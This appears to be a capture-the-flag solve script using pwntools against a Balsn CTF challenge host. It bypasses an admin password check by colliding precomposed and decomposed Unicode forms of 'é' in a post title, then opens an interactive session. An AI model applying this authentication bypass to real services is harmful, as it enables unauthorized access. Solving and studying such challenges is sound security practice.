#!/usr/bin/env python3
from pwn import *


def connect():
    return remote('machbookair.balsnctf.com', 19091)


def main():
    with connect() as tube:
        tube.recvuntil(b'admin: ')
        tube.sendline(b'\xc3\xa9')

        tube.recvuntil(b'> ')
        tube.sendline(b'1')  # Create Post.
        tube.recvuntil(b'title: ')
        tube.sendline(b'\x65\xcc\x81')
        tube.recvuntil(b'content: ')
        tube.sendline(b'A')

        tube.recvuntil(b'> ')
        tube.sendline(b'3')  # Admin Area.
        tube.recvuntil(b'password: ')
        tube.sendline(b'A')

        tube.interactive()


if __name__ == '__main__':
    main()
